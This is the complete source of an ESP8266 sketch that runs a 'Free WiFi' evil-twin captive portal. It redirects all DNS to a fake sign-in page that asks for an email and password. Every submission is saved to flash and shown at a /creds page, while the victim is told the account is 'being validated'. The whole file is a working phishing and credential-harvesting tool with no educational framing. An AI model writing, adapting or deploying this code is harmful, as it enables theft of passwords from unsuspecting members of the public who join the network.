#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>


#define SSID_NAME "Free WiFi"
#define SUBTITLE "Free WiFi service."
#define TITLE "Sign in:"
#define BODY "Create an account to get connected to the internet."
#define POST_TITLE "Validating..."
#define POST_BODY "Your account is being validated. Please, wait up to 5 minutes for device connection.</br>Thank you."
#define PASS_TITLE "Credentials"
#define CLEAR_TITLE "Cleared"


void readData();
void writeData(String data);
void deleteData();


const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1);  

String data = "";
String Credentials = "";
int savedData = 0;
int timer = 5000;
int i = 0;
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String footer() { return 
  "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}

String header(String t) {
  String a = String(SSID_NAME);
  String CSS = 
    "body { color: #333; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; text-align: center; background-color: #f9f9f9; }"
    "h1 { color: #ff6600; font-size: 2.5em; margin-bottom: 10px; }"
    "nav { background-color: #990033; color: white; padding: 20px 10px; text-align: left; }"
    "nav b { font-size: 1.5em; display: block; }"
    "input[type=text], input[type=password] { width: 80%; padding: 10px; margin: 10px 0; border: 1px solid #555; border-radius: 4px; box-sizing: border-box; }"
    "input[type=submit] { width: 50%; background-color: #3366cc; color: white; padding: 12px; border: none; border-radius: 4px; cursor: pointer; }"
    "input[type=submit]:hover { background-color: #ff6600; }"
    ".footer { margin-top: 20px; font-size: 0.9em; color: #666; }";

  String h = "<!DOCTYPE html><html>"
             "<head><title>" + a + " :: " + t + "</title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style></head>"
             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}


String creds() {
  return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
}

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post>" +
    "<b>Email:</b> <center><input type=text autocomplete=email name=email></input></center>" +
    "<b>Password:</b> <center><input type=password name=password></input><input type=submit value=\"Sign in\"></form></center>" + footer();
}

String posted() {
  String email = input("email");
  String password = input("password");
  readData();  
  Credentials = data + "<li>Email: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>";
  data = Credentials;
  writeData(data);
  savedData = 1;
  return header(POST_TITLE) + POST_BODY + footer();
}

String clear() {
  String email = "<p></p>";
  String password = "<p></p>";
  Credentials = "<p></p>";
  data = "";
  savedData = 0;
  deleteData();  
  return header(CLEAR_TITLE) + "<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}

void BLINK() {  
  int count = 0;
  while (count < 5) {
    digitalWrite(LED_BUILTIN, LOW);
    delay(500);
    digitalWrite(LED_BUILTIN, HIGH);
    delay(500);
    count = count + 1;
  }
}

void readData()  
{
  File file = LittleFS.open("/SavedFile.txt", "r");
  if (!file) {
    return;
  }
  data = "";  
  int i = 0;
  char myArray[1000];
  while (file.available()) {

    myArray[i] = (file.read());  
    i++;
  }
  myArray[i] = '\0';  

  file.close();
  data = String(myArray);  
  if (data != ""){
    savedData=1;
  }
}

void writeData(String data) {
  File file = LittleFS.open("/SavedFile.txt", "w");
  file.print(data);
  delay(1);
  file.close();
}

void deleteData() {
  LittleFS.remove("/SavedFile.txt");
}

void setup() {
  bootTime = lastActivity = millis();
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  dnsServer.start(DNS_PORT, "*", APIP);  
  webServer.on("/post", []() {
    webServer.send(HTTP_CODE, "text/html", posted());
    BLINK();
  });
  webServer.on("/creds", []() {
    webServer.send(HTTP_CODE, "text/html", creds());
  });
  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear());
  });
  webServer.onNotFound([]() {
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html", index());
  });
  webServer.begin();
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);
  Serial.begin(115200);

  //LittleFS set up
  if (!LittleFS.begin()) {
    Serial.println("An Error has occurred while mounting LittleFS");
    delay(1000);
    return;
  }
  readData();

}


void loop() {
  if ((millis() - lastTick) > TICK_TIMER) { lastTick = millis(); }
  dnsServer.processNextRequest();
  webServer.handleClient();
  i++;
  Serial.println(i);
  Serial.println(savedData);
  if (i == timer && savedData == 1) {
    i = 0;
    digitalWrite(LED_BUILTIN, LOW);
    delay(50);
    digitalWrite(LED_BUILTIN, HIGH);
  }
  if (i > timer) { i = 0; }
}